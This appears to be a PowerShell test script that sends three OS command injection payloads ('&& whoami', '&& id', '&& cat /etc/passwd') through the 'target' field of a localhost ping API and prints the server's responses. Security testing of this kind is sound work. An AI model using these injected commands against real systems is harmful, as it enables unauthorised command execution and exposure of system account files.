Write-Host "=== OS COMMAND INJECTION TEST ===" -ForegroundColor Cyan
Write-Host ""

Write-Host "TEST 1: Basic ping with whoami injection" -ForegroundColor Yellow
$body = @{target = "8.8.8.8 && whoami"} | ConvertTo-Json
try {
    $response = Invoke-WebRequest -Uri http://localhost/api/it/network/ping -Method POST -Body $body -ContentType application/json -ErrorAction Stop
    $json = $response.Content | ConvertFrom-Json
    Write-Host "Status: $($response.StatusCode) ✓" -ForegroundColor Green
    Write-Host "Command: $($json.command)" -ForegroundColor Green
    Write-Host "Output:" -ForegroundColor Cyan
    Write-Host $json.output -ForegroundColor Green
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
}
Write-Host ""

Write-Host "TEST 2: Command injection with id" -ForegroundColor Yellow
$body = @{target = "8.8.8.8 && id"} | ConvertTo-Json
try {
    $response = Invoke-WebRequest -Uri http://localhost/api/it/network/ping -Method POST -Body $body -ContentType application/json -ErrorAction Stop
    $json = $response.Content | ConvertFrom-Json
    Write-Host "Status: $($response.StatusCode) ✓" -ForegroundColor Green
    Write-Host "Output:" -ForegroundColor Cyan
    Write-Host $json.output -ForegroundColor Green
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
}
Write-Host ""

Write-Host "TEST 3: Command injection with cat /etc/passwd" -ForegroundColor Yellow
$body = @{target = "8.8.8.8 && cat /etc/passwd"} | ConvertTo-Json
try {
    $response = Invoke-WebRequest -Uri http://localhost/api/it/network/ping -Method POST -Body $body -ContentType application/json -ErrorAction Stop
    $json = $response.Content | ConvertFrom-Json
    Write-Host "Status: $($response.StatusCode) ✓" -ForegroundColor Green
    Write-Host "Output (first 800 chars):" -ForegroundColor Cyan
    Write-Host ($json.output.Substring(0, [Math]::Min(800, $json.output.Length))) -ForegroundColor Green
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
}
